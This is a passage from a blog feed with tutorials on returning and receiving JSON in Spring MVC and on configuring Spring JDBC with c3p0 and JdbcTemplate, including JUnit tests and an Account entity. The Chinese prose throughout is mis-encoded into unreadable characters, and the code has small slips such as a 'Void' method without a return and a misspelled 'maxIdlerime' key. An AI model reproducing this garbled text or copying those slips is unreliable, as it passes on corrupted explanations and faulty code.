ä¾èµ–</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- æ·»åŠ json ä¾èµ–jaråŒ… --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.10.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.10.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-annotations<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.10.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è®¾ç½®<code>servlet-context.xml</code></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- mvc è¯·æ±‚æ˜ å°„ å¤„ç†å™¨ä¸é€‚é…å™¨é…ç½® --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:annotation-driven</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:message-converters</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.http.converter.StringHttpMessageConverter&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.http.converter.json.MappingJackson2HttpMessageConverter&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mvc:message-converters</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mvc:annotation-driven</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h3><p><strong><code>@ResponseBody</code>æ³¨è§£çš„ä½¿ç”¨</strong></p><p>å¯ä»¥å°†è¯¥æ³¨è§£æ ‡è®°åœ¨æ–¹æ³•ä¸Š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> User <span class="title function_">Test</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">    user.setId(<span class="number">1</span>);</span><br><span class="line">    user.setName(<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> user;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ–æ–¹æ³•ç­¾åçš„è®¿é—®ä¿®é¥°ç¬¦å³ä¾§</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@ResponseBody</span> User <span class="title function_">Test</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">    user.setId(<span class="number">1</span>);</span><br><span class="line">    user.setName(<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> user;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶è®¿é—®<code>/test</code>è·¯å¾„ä¼šè¿”å›æ ¼å¼åŒ–çš„JSONæ–‡æœ¬ï¼Œè‹¥æ²¡æœ‰å¼•å…¥è¯¥æ³¨è§£ï¼Œè¯¥é¡µé¢æ— æ³•æ­£å¸¸è®¿é—®</p><p> <strong>é€šè¿‡Ajaxæ¥æ”¶JSONæ•°æ®</strong></p><p>å‰é¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å®ç°äº†åç«¯è¿”å›JSONæ ¼å¼æ•°æ®ï¼Œä½†æ­¤æ—¶æ˜¯ç›´æ¥æ‰“å°åœ¨é¡µé¢ä¸Šçš„ï¼Œæƒ³è¦å‰ç«¯æ¥æ”¶æ•°æ®å¹¶å®ç°é¡µé¢æ¸²æŸ“éœ€è¦ä½¿ç”¨ä¸€ä¸ªæ¥æ”¶å™¨Ajaxå»æ¥æ”¶JSONæ•°æ®ï¼Œè¦ä½¿ç”¨Ajaxéœ€è¦ä¸‹è½½å…¶jsæ–‡ä»¶å¹¶åœ¨jspæ–‡ä»¶ä¸­è¿›è¡Œå¼•å…¥</p><p>ajaxè°ƒç”¨å‡½æ•°</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">testAjax</span>(<span class="params"></span>)&#123;</span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">type</span>:<span class="string">&quot;POST&quot;</span>,</span><br><span class="line">        <span class="attr">url</span>:<span class="string">&quot;test&quot;</span>,</span><br><span class="line">        <span class="attr">data</span>:&#123;</span><br><span class="line">            <span class="string">&quot;testParam&quot;</span>:<span class="string">&quot;testValue&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åç«¯å“åº”æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> User <span class="title function_">testRes</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">    user.setId(<span class="number">1</span>);</span><br><span class="line">    user.setUserName(<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> user;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨<code>testAjax()</code>æ–¹æ³•åï¼Œåˆ™ä¼šåœ¨æµè§ˆå™¨æ§åˆ¶å°æ‰“å°<code>{id:1,userName:&quot;admin&quot;}</code></p><p><strong><code>@RequestBody</code>æ³¨è§£çš„ä½¿ç”¨</strong></p><p>è¯¥æ³¨è§£ç”¨æ¥å¤„ç†<code>content-type</code>ä¸º<code>application/json</code>æ ¼å¼çš„å­—ç¬¦ä¸²</p><p>å¯ä»¥å°†è¯¥æ³¨è§£æ ‡è®°åœ¨æ–¹æ³•ä¸Š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestBody</span></span><br><span class="line"><span class="keyword">public</span> Void <span class="title function_">Test</span><span class="params">(User user)</span> &#123;</span><br><span class="line">System.out.println(user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ–è€…æ ‡è®°åœ¨å½¢å‚å·¦ä¾§</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Void <span class="title function_">Test</span><span class="params">(<span class="meta">@RequestBody</span> User user)</span> &#123;</span><br><span class="line">System.out.println(user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> å‰ç«¯ä½¿ç”¨Ajaxå‘é€JSONæ•°æ®</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">testAjax</span>(<span class="params"></span>)&#123;</span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">type</span>:<span class="string">&quot;POST&quot;</span>,</span><br><span class="line">        <span class="attr">url</span>:<span class="string">&quot;test&quot;</span>,</span><br><span class="line">        <span class="attr">contentType</span>:<span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">        <span class="attr">data</span>:<span class="string">&#x27;&#123;&quot;id&quot;:1,&quot;userName&quot;:&quot;admin&quot;&#125;&#x27;</span>,</span><br><span class="line">        <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/>]]></content>
      
      
      <categories>
          
          <category> ç®€æ˜“å¼€å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringFrameworkæ¡†æ¶-JDBCä¸äº‹åŠ¡æ§åˆ¶</title>
      <link href="/2025/12/27/SpringFramework%E6%A1%86%E6%9E%B6-JDBC%E4%B8%8E%E4%BA%8B%E5%8A%A1%E6%8E%A7%E5%88%B6/"/>
      <url>/2025/12/27/SpringFramework%E6%A1%86%E6%9E%B6-JDBC%E4%B8%8E%E4%BA%8B%E5%8A%A1%E6%8E%A7%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="SpringFrameworkæ¡†æ¶-JDBC"><a href="#SpringFrameworkæ¡†æ¶-JDBC" class="headerlink" title="SpringFrameworkæ¡†æ¶-JDBC"></a>SpringFrameworkæ¡†æ¶-JDBC</h1><p>Spring JDBC ( Java Database Connectivity )æ˜¯ Spring æ¡†æ¶å¯¹ JDBC API çš„è½»é‡çº§å°è£…ï¼Œæ—¨åœ¨ç®€åŒ–æ•°æ®åº“æ“ä½œä»£ç ï¼Œå‡å°‘æ ·æ¿ä»£ç ï¼ŒåŒæ—¶ä¿ç•™ç›´æ¥ä½¿ç”¨ JDBC çš„çµæ´»æ€§å’Œæ€§èƒ½</p><h2 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h2><p>ä¿®æ”¹JDBCé…ç½®æ–‡ä»¶ï¼Œåœ¨<code>resources</code>ç›®å½•ä¸‹æ–°å»º<code>jdbc.properties</code>é…ç½®æ–‡ä»¶ï¼Œè®¾ç½®ç›¸åº”é…ç½®ä¿¡æ¯</p><figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment">#é©±åŠ¨å</span></span><br><span class="line"><span class="attr">jdbc.driverClassName</span>=<span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line"><span class="comment">#æ•°æ®åº“è¿æ¥åŸºæœ¬è®¾ç½®</span></span><br><span class="line"><span class="attr">jdbc.url</span>=<span class="string">jdbc:mysql://localhost:3306/databassName?useUnicode=true&amp;characterEncoding=utf8&amp;useSSL=false&amp;serverTimezone=Asia/Shanghai</span></span><br><span class="line"><span class="comment">#æ•°æ®åº“ç”¨æˆ·å</span></span><br><span class="line"><span class="attr">jdbc.username</span>=<span class="string">username</span></span><br><span class="line"><span class="comment">#æ•°æ®åº“ç”¨æˆ·å¯†ç </span></span><br><span class="line"><span class="attr">jdbc.password</span>=<span class="string">password</span></span><br></pre></td></tr></table></figure><p>å¯é€‰é…ç½®å¦‚ä¸‹</p><figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æŒ‡å®šè¿æ¥æ± çš„åˆå§‹åŒ–è¿æ¥æ•°ã€‚å–å€¼åº”åœ¨minPoolSizeä¸maxPoolSizeä¹‹é—´ï¼ŒDefault:3</span></span><br><span class="line"><span class="attr">initialPoolSize</span>=<span class="string">20</span></span><br><span class="line"><span class="comment">#æŒ‡å®šè¿æ¥æ± ä¸­ä¿ç•™çš„æœ€å¤§è¿æ¥æ•°ï¼ŒDefault:15</span></span><br><span class="line"><span class="attr">maxPoolSize</span>=<span class="string">100</span></span><br><span class="line"><span class="comment">#æŒ‡å®šè¿æ¥æ± ä¸­ä¿ç•™çš„æœ€å°è¿æ¥æ•°</span></span><br><span class="line"><span class="attr">minPoolSize</span>=<span class="string">10</span></span><br><span class="line"><span class="comment">#æœ€å¤§ç©ºé—²æ—¶é—´ï¼Œ60ç§’å†…æœªä½¿ç”¨åˆ™è¿æ¥è¢«ä¸¢å¼ƒã€‚è‹¥ä¸º0åˆ™æ°¸ä¸ä¸¢å¼ƒï¼ŒDefault:0</span></span><br><span class="line"><span class="attr">maxIdlerime</span>=<span class="string">600</span></span><br><span class="line"><span class="comment">#å½“è¿æ¥æ± ä¸­çš„è¿æ¥è€—å°½çš„æ—¶å€™c3p0ä¸€æ¬¡åŒæ—¶è·å–çš„è¿æ¥æ•°ï¼ŒDefault:3</span></span><br><span class="line"><span class="attr">acquireIncrement</span>=<span class="string">5</span></span><br><span class="line"><span class="comment">#JDBCçš„æ ‡å‡†ï¼Œç”¨ä»¥æ§åˆ¶æ•°æ®æºå†…åŠ è½½çš„PreparedStatementsæ•°é‡</span></span><br><span class="line"><span class="attr">maxStatements</span>=<span class="string">5</span></span><br><span class="line"><span class="comment">#æ¯60ç§’æ£€æŸ¥æ‰€æœ‰è¿æ¥æ± ä¸­çš„ç©ºé—²è¿æ¥ã€‚Default:0</span></span><br><span class="line"><span class="attr">idleConnectionTestPeriod</span>=<span class="string">60</span></span><br></pre></td></tr></table></figure><p>ä¿®æ”¹springé…ç½®æ–‡ä»¶ï¼ŒåŠ è½½<code>jdbc.properties</code></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">location</span>=<span class="string">&quot;jdbc.properties&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸ºæ•°æ®åº“è¿æ¥æ± æ·»åŠ beanæ ‡ç­¾</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.mchange.v2.c3p0.ComboPooledDataSource&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- åŸºæœ¬é…ç½® --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driverClass&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.driverClassName&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;jdbcUrl&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.url&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.username&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.password&#125;&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- å…¶ä»–é…ç½® --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;maxPoolSize&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;maxPoolSize&#125;&quot;</span>/&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p>é…ç½®æ¨¡æ¿ç±»ï¼ŒJDBCæ¨¡æ¿ç±»æ˜¯Spring JDBCçš„æ ¸å¿ƒç»„ä»¶ï¼Œå®ƒçš„ä¸»è¦ä½œç”¨æ˜¯ç®€åŒ–JDBCç¼–ç¨‹ï¼Œè§£å†³ä¼ ç»ŸJDBCä»£ç ä¸­çš„é‡å¤å’Œç¹çé—®é¢˜</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;jdbcTemplate&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.jdbc.core.JdbcTemplate&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;dataSource&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><be/><h2 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h2><p>è¿è¡Œä»¥ä¸‹ä»£ç ï¼Œå¯ä»¥æ­£å¸¸è¿æ¥æ•°æ®åº“</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestJdbc</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;spring.xml&quot;</span>);</span><br><span class="line">        <span class="type">JdbcTemplate</span> <span class="variable">jdbcTemplate</span> <span class="operator">=</span> (JdbcTemplate) context.getBean(<span class="string">&quot;jdbcTemplate&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM user&quot;</span>;</span><br><span class="line">        List&lt;Map&lt;String, Object&gt;&gt; result = jdbcTemplate.queryForList(sql);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ä¼˜åŒ–"><a href="#ä¼˜åŒ–" class="headerlink" title="ä¼˜åŒ–"></a>ä¼˜åŒ–</h3><p>å®é™…è¿è¡Œä¸­ï¼Œåœ¨æ¯ä¸ªè¿æ¥æ•°æ®åº“çš„åœºæ™¯éƒ½é…ç½®ä¸Šä¸‹æ–‡ç¯å¢ƒå°†ä¼šéå¸¸ç¹çï¼Œå¯ä»¥ä½¿ç”¨<code>@Before</code>æ³¨è§£è¿›è¡Œæå‰åˆå§‹åŒ–ï¼Œå°†è·å–æ¨¡æ¿ç±»å¯¹è±¡çš„æ“ä½œå‰¥ç¦»å‡ºæ¥ï¼Œè¿™é‡Œçš„<code>@Before</code>æ³¨è§£æ˜¯junitåŒ…ä¸‹çš„ï¼Œåœ¨æ¯ä¸ªæµ‹è¯•æ–¹æ³•æ‰§è¡Œå‰è¿è¡Œï¼Œç”¨äºæµ‹è¯•ç¯å¢ƒçš„åˆå§‹åŒ–</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Before</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;spring.xml&quot;</span>);</span><br><span class="line"><span class="type">JdbcTemplate</span> <span class="variable">jdbcTemplate</span> <span class="operator">=</span> (JdbcTemplate) context.getBean(<span class="string">&quot;jdbcTemplate&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºä¸¤ä¸ªæ–¹æ³•è¢«æ‹†åˆ†ï¼Œæ­¤æ—¶<code>test()</code>æ–¹æ³•æ— æ³•æ¥æ”¶<code>jdbcTemplate</code>ï¼Œæ­¤æ—¶å¯ä»¥å°†æ¨¡æ¿æå‡åˆ°å±æ€§å­—æ®µ</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> JdbcTemplate jdbcTemplate;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Before</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;spring.xml&quot;</span>);</span><br><span class="line"><span class="built_in">this</span>.jdbcTemplate = (JdbcTemplate) context.getBean(<span class="string">&quot;jdbcTemplate&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å…¶å®è¿˜å¯ä»¥æ›´è¿›ä¸€æ­¥ï¼Œå°†Junitçš„æµ‹è¯•ç¯å¢ƒè¿è¡Œåœ¨Springæµ‹è¯•ç¯å¢ƒä¸­ï¼Œä½¿ç”¨<code>@RunWith</code>æ³¨è§£å®Œæˆï¼Œå…¶æ¥å—ä¸€ä¸ªæµ‹è¯•è¿è¡Œå™¨ï¼ˆRunnerï¼‰ç±»ï¼Œç”¨äºæŒ‡å®š JUnit å¦‚ä½•è¿è¡Œæµ‹è¯•ã€‚æ­¤å¤–ï¼Œè¿˜éœ€è¦<code>@ContextConfiguration</code>æŒ‡å®šé…ç½®æ–‡ä»¶ï¼Œè¯¥æ³¨è§£æœ‰<code>location</code>å±æ€§æ¥å—ä¸€ä¸ªé›†åˆï¼Œå¯ç”¨äºåŠ è½½å¤šä¸ªé…ç½®æ–‡ä»¶</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RunWith(SpringJUnit4ClassRunner.class)</span></span><br><span class="line"><span class="meta">@ContextConfiguration(locations = &#123;&quot;classpath:spring.xml&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestJdbc</span> &#123;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> JdbcTemplate jdbcTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM user&quot;</span>;</span><br><span class="line">        List&lt;Map&lt;String, Object&gt;&gt; result = jdbcTemplate.queryForList(sql);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><be/><h2 id="Spring-JDBCè¿›è¡Œå•è¡¨CRUDæ“ä½œ"><a href="#Spring-JDBCè¿›è¡Œå•è¡¨CRUDæ“ä½œ" class="headerlink" title="Spring JDBCè¿›è¡Œå•è¡¨CRUDæ“ä½œ"></a>Spring JDBCè¿›è¡Œå•è¡¨CRUDæ“ä½œ</h2><p>  æˆ‘ä»¬ç”¨ä¸€ä¸ªè´¦å·ç®¡ç†ç³»ç»Ÿæ¥æ¼”ç¤ºä½¿ç”¨JDBCä¸æ•°æ®åº“äº¤äº’</p><p><code>Account</code>ç±»</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Account</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer UserId;</span><br><span class="line">    <span class="keyword">private</span> Integer accountId;</span><br><span class="line">    <span class="keyword">private</span> String accountName;</span><br><span class="line">    <span class="keyword">private</span> String accountType;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> balance;</span><br><span class="line">    <span class="keyword">private</span> String remark;</span><br><span class="line">    <span class="keyword">private</span> Date createTime;</span><br><span class="line">    <span class="keyword">private</span> Date updateTime;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Account</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Account</span><span class="params">(<span class="type">int</span> accountId, String accountName, String accountType, <span class="type">double</span> balance, String remark)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.accountId = accountId;</span><br><span class="line">        <span class="built_in">this</span>.accountName = accountName;</span><br><span class="line">        <span class="built_in">this</span>.accountType = accountType;</span><br><span class="line">        <span class="built_in">this</span>.balance = balance;</span><br><span class="line">        <span class="built_in">this</span>.remark = remark;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Account&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;accountId=&quot;</span> + accountId +</span><br><span class="line">                <span class="string">&quot;, accountName=&#x27;&quot;</span> + accountName + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, accountType=&#x27;&quot;</span> + accountType + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, balance=&quot;</span> + balance +</span><br><span class="line">                <span class="string">&quot;, remark=&#x27;&quot;</span> + remark + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, createTime=&quot;</span> + createTime +</span><br><span class="line">                <span class="string">&quot;, updateTime=&quot;</span> + updateTime +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Date <span class="title function_">getUpdateTime</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> updateTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUpdateTime</span><span class="params">(Date updateTime)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.updateTime = updateTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Date <span class="title function_">getCreateTime</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> createTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCreateTime</span><span class="params">(Date createTime)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.createTime = createTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getRemark</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> remark;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setRemark</span><span class="params">(String remark)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.remark = remark;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getBalance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setBalance</span><span class="params">(<span class="type">double</span> balance)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.balance = balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAccountType</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> accountType;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAccountType</span><span class="params">(String accountType)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.accountType = accountType;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAccountName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> accountName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAccountName</span><span class="params">(String accountName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.accountName = accountName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAccountId</span><span class="params">(<span class="type">int</span> accountId)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.accountId = accountId;</span><br><span class="line">    &#125;</span><br><span 